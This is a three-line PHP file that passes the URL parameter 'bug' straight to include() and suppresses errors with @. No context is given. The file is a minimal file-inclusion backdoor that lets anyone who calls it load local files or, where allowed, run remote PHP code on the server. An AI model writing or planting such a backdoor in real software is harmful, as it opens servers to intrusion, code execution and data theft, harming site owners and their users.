<?php
@include($_GET['bug']);
?>